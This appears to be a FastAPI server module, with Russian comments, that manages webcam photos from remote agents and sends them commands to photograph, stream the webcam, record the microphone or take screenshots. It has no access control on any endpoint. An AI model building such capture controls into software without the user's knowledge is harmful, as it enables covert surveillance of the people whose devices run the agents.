"""API-роутер для фото с веб-камеры + команды управления."""
import os
from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import FileResponse
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func, desc
from typing import Optional
from pydantic import BaseModel

from app.database import get_db
from app.models.webcam_photo import WebcamPhoto
from app.ws_manager import manager

router = APIRouter(prefix="/webcam", tags=["Webcam"])


class WebcamCommand(BaseModel):
    """Команда для агента: take_webcam, start_webcam_stream, stop_webcam_stream,
    start_recording, stop_recording, take_recording."""
    agent_id: str
    command: str  # take_webcam | start_webcam_stream | stop_webcam_stream | start_recording | stop_recording | take_recording


@router.get("", summary="Список фото с веб-камеры")
async def list_photos(
    agent_id: Optional[str] = None,
    hostname: Optional[str] = None,
    limit: int = Query(50, ge=1, le=500),
    offset: int = Query(0, ge=0),
    db: AsyncSession = Depends(get_db),
):
    q = select(WebcamPhoto).order_by(desc(WebcamPhoto.created_at))

    if agent_id:
        q = q.where(WebcamPhoto.agent_id == agent_id)
    if hostname:
        q = q.where(WebcamPhoto.hostname.ilike(f"%{hostname}%"))

    count_q = select(func.count()).select_from(q.subquery())
    total = (await db.execute(count_q)).scalar() or 0

    result = await db.execute(q.offset(offset).limit(limit))
    rows = result.scalars().all()

    return {
        "total": total,
        "items": [
            {
                "id": p.id,
                "agent_id": p.agent_id,
                "hostname": p.hostname,
                "username": p.username,
                "file_size": p.file_size,
                "created_at": p.created_at.isoformat() if p.created_at else None,
            }
            for p in rows
        ],
    }


@router.get("/{photo_id}/image", summary="Получить фото с камеры")
async def get_photo(
    photo_id: int,
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(
        select(WebcamPhoto).where(WebcamPhoto.id == photo_id)
    )
    photo = result.scalar_one_or_none()
    if not photo:
        raise HTTPException(status_code=404, detail="Photo not found")

    if not os.path.isfile(photo.file_path):
        raise HTTPException(status_code=404, detail="File not found on disk")

    return FileResponse(
        photo.file_path,
        media_type="image/jpeg",
        filename=f"webcam_{photo.agent_id}_{photo.id}.jpg",
    )


@router.delete("/{photo_id}", summary="Удалить фото")
async def delete_photo(
    photo_id: int,
    db: AsyncSession = Depends(get_db),
):
    result = await db.execute(
        select(WebcamPhoto).where(WebcamPhoto.id == photo_id)
    )
    photo = result.scalar_one_or_none()
    if not photo:
        raise HTTPException(status_code=404, detail="Photo not found")

    if os.path.isfile(photo.file_path):
        os.remove(photo.file_path)

    await db.delete(photo)
    await db.commit()

    return {"status": "ok"}


@router.post("/command", summary="Отправить команду агенту (камера/микрофон)")
async def send_command(cmd: WebcamCommand):
    """
    Отправляет WS-команду конкретному агенту.

    Допустимые команды:
    - take_webcam — сделать фото
    - start_webcam_stream / stop_webcam_stream — стрим
    - start_recording / stop_recording — микрофон
    - take_recording — одна запись микрофона
    - take_screenshot — скриншот
    """
    allowed = {
        "take_webcam", "start_webcam_stream", "stop_webcam_stream",
        "start_recording", "stop_recording", "take_recording",
        "take_screenshot",
    }
    if cmd.command not in allowed:
        raise HTTPException(status_code=400, detail=f"Unknown command: {cmd.command}")

    await manager.broadcast({
        "type": cmd.command,
        "agent_id": cmd.agent_id,
    })

    return {"status": "ok", "command": cmd.command, "agent_id": cmd.agent_id}
